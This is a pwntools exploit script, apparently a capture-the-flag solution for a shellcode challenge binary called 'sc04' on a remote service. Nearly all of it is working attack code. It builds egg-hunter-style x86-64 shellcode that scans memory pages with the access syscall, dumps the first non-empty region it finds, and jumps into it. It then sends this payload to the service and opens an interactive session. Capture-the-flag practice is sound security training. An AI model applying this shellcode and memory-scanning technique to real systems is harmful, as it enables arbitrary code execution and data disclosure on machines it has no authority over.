#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./sc04')

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30014)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *runShellcode
continue
'''.format(**locals())

# -- Exploit goes here --

#   push rdi;
#   mov rax, 1;
#   mov rdi, 1;
#   push rsp;
#   pop rsi;
#   mov rdx, 10;
#   syscall;
#   pop rdi;
#   mov rdx, 0x1000;
#   xor rsi, rsi;
#   mov rax, 0xfffffffffffffffe;


shellcode = """
_start:
  xor edi, edi;
  mul edi      ; 
  xchg eax, esi ;

  inc edx;
  shl edx, 12               ;

increment_page:
  lea rdi, [rdi + rdx]      ;

increment_address:
  push 21;
  pop rax                   ; 
  syscall                   ; 

  cmp al, 0xf2              ; 
  je increment_page         ; 


  cmp rdi, 0xdead000
  je increment_page


compare:
  
  xor r8, r8;
  mov r8, rdi;
  mov r9, rdi;
  add r9, 0x1000;
  compare2:
  mov rax, [r8];
  
  add r8, 0x20;
  cmp r8, r9;
  je increment_page;
  cmp rax, 0;
  je compare2;
  sub r8, 0x40;
    mov rax, 1;
  mov rdi, 1;
  mov rsi, r8;
  mov rdx, 0x100;
  syscall;
  jmp r8                   ;
"""

lol = asm(shellcode)
# print(lol)
print(len(lol))
# lol = asm(shellcode)
# print(len(lol))
io = start()
io.recvuntil(b">")
io.send(lol)

io.interactive()

